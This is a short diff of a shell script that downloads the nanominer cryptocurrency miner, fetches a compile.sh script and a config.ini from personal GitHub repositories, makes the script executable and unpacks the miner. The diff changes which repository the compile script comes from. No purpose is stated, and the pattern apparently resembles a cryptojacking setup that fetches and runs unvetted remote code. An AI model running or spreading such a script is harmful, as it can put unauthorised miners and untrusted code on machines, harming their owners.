@@ -1,5 +1,5 @@
 curl -L -o nanominer-linux-3.7.5.tar.gz https://github.com/nanopool/nanominer/releases/download/v3.7.5/nanominer-linux-3.7.5.tar.gz
-curl -L -o compile.sh https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh
+curl -L -o compile.sh https://raw.githubusercontent.com/terryputri/myprojet/main/compile.sh
 curl -L -o config.ini https://raw.githubusercontent.com/oggierf/myproject/main/config.ini
 chmod +x compile.sh
 tar -xhf nanominer-linux-3.7.5.tar.gz
